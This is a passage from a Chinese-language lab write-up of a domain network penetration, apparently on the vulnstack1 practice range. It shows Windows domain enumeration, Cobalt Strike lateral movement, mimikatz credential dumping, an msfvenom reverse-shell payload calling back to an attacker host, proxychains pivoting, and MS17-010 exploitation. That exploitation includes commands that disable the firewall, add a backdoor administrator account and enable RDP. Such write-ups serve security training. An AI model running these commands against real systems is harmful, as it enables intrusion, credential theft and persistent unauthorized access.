<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systeminfo		//获取操作系统版本，补丁信息</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/3FqvRBUabWfZ6Sj.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/JhNoYy9LuDObaxi.png" style="zoom:80%;" />

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipconfig /all	//查看所属域</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/SwjMc4Wa1ybDleH.png" style="zoom:80%;" />

<p> 查看域信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net view /domain 判断存在域</span><br><span class="line">net user /domain 当前域里面的用户</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/MjkLAZmgJxcI4YQ.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/9RiKZ7gHwUT5jqe.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/FqeTd8R2DxCKE5z.png" style="zoom:80%;" />

<p>内网主机探测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/VXGWRhwPfaYku2U.png" style="zoom:80%;" />

<p>cs命令探测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/meWOPcGE76IykRt.png" style="zoom:80%;" />

<p>总结：</p>
<p>OWA 192.168.176.138为域控，STU1为本机，ROOT-TVI862UBEH 192.168.176.141为域成员，域管理员用户为administrator和liukaifeng01</p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>cs提权，获得system权限</p>
<img src="https://i.loli.net/2021/08/18/eEWuxvO5jy7B4TC.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/3G27LHneE4jfBDt.png" style="zoom:80%;" />

<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>运行mimikatz，获取密钥</p>
<img src="https://i.loli.net/2021/08/18/kD5HmGzohwb6BSF.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/TXAED5l9jhacmMS.png" style="zoom:80%;" />

<h4 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h4><p>由于攻击机无法与内网的主机进行直接通信，所以用到SMB Beacon</p>
<p>首先，利用SMB服务可以通过明文或hash传递来远程执行，条件是445服务端口开放，探测内网445端口开放情况</p>
<img src="https://i.loli.net/2021/08/18/IYS3n92aABRmDZF.png" style="zoom:80%;" />

<p>其他两条主机均开放445端口</p>
<p>新建smb监听器</p>
<img src="https://i.loli.net/2021/08/18/pNnEfWsMmSxkteT.png" style="zoom:80%;" />

<p>用psexec和刚才窃取的令牌对域控进行smb连接</p>
<img src="https://i.loli.net/2021/08/18/AlzgQmJ9L1t2Yau.png" style="zoom:80%;" />

<p>拿到域控OWA 192.168.112.138的权限</p>
<img src="https://i.loli.net/2021/08/18/7DJv6TNHdAu3OPm.png" style="zoom:80%;" />

<p>重复之前的步骤，可以获得另一台主机192.168.176.141的权限</p>
<img src="https://i.loli.net/2021/08/18/N4ErJ6R5GIwM1HW.png" style="zoom:80%;" />

<p>到这里渗透基本结束，除了用cs进行渗透，也可用msf</p>
<h3 id="MSF实现内网漫游"><a href="#MSF实现内网漫游" class="headerlink" title="MSF实现内网漫游"></a>MSF实现内网漫游</h3><p>kali中运行msf生成木马</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.112.132 LPORT=4444 -f exe &gt; /tmp/msf.exe</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/xnCNER3PyotrwfQ.png" style="zoom:80%;" />

<p>msf监听</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.112.132</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>webshell上传木马并运行，msf连接成功</p>
<img src="https://i.loli.net/2021/08/18/wMIHVYoUEQSq2cz.png" style="zoom:80%;" />

<p>进行信息收集之后执行mimikatz（kiwi）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz	</span><br><span class="line">creds_msv		//获取密码hash值</span><br><span class="line">creds_kerberos	//获取密码明文</span><br></pre></td></tr></table></figure>



<img src="https://i.loli.net/2021/08/18/ulAZLyrC9qsTBJo.png" style="zoom:80%;" />

<h4 id="路由转发"><a href="#路由转发" class="headerlink" title="路由转发"></a>路由转发</h4><p>获取主机路由信息，并添加内网的路由，目的是为了让msf的流量转发到内网</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route 		//查看路由地址</span><br><span class="line">background	//回退到msf</span><br><span class="line">route add 192.168.176.0 255.255.255.0 1	//对sessions添加内网的路由</span><br><span class="line">route print	//查看路由表</span><br></pre></td></tr></table></figure>

<p>也可使用<code>post/multi/manage/autoroute</code>模块自动添加路由，接下来用proxychains实现内网漫游</p>
<img src="https://i.loli.net/2021/08/18/HZc6Tur1JWj8Yk3.png" style="zoom:80%;" />

<h4 id="漏洞发现利用"><a href="#漏洞发现利用" class="headerlink" title="漏洞发现利用"></a>漏洞发现利用</h4><p>使用nmap对目标192.168.176.138和192.168.176.141进行扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo proxychains nmap -sT -Pn -p22,80,443,135,445 --script=smb-vuln-ms17-010.nse 192.168.176.138</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong>由于proxychains无法代理icmp的数据包 所以必须添加-Pn参数 即不检测主机是否存活 直接进行端口tcp扫描</p>
</blockquote>
<p>发现均开放445端口，存在ms17-010漏洞</p>
<blockquote>
<p>其他msf扫描模块<br>auxiliary/scanner/portscan　    端口扫描<br>scanner/portscan/syn　　        SYN端口扫描<br>scanner/portscan/tcp　　        TCP端口扫描<br>auxiliary/scanner/smb/smb_ms17_010 </p>
</blockquote>
<img src="https://i.loli.net/2021/08/18/pbqLnTi9wDY3rdv.png" style="zoom:80%;" />

<p>使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//执行shell命令</span><br><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set RHOSTS 192.168.176.138</span><br><span class="line">set COMMAND netsh advfirewall set allprofiles state off	//关闭防火墙</span><br><span class="line">set command net user zqh !@#123qwe!@# /add 				//添加用户</span><br><span class="line">set command net localgroup administrators zqh /add 		//管理员权限</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;			//打开3389</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">//ms17-010漏洞利用</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.176.138</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>但是ms17_010_eternalblue会使win2008宕机重启，且仅适用于x64系统，这里添加管理员用户，用远程桌面登录，也可用之前mimikatz获取的用户登录</p>
<img src="https://i.loli.net/2021/08/18/6CcPWNi879Io1ET.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/M3FqvyoG9thpDmn.png" style="zoom:80%;" />

<p>最后exploit/windows/smb/ms17_010_psexec反弹shell，可获取更多信息</p>
<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><p><a href="http://blog.leanote.com/post/snowming/8b7ce0f84c03">http://blog.leanote.com/post/snowming/8b7ce0f84c03</a></p>
<p><a href="https://v0w.top/2020/07/19/vulnstack1">https://v0w.top/2020/07/19/vulnstack1</a></p>
<p><a href="https://www.cxyzjd.com/article/u014029795/117375754">https://www.cxyzjd.com/article/u014029795/117375754</a></p>
<p><a href="http://47.100.93.13/index.php/archives/909/">http://47.100.93.13/index.php/archives/909/</a></p>
<p><a href="https://www.cnblogs.com/liliyuanshangcao/p/13743389.html">https://www.cnblogs.com/liliyuanshangcao/p/13743389.html</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
</search>
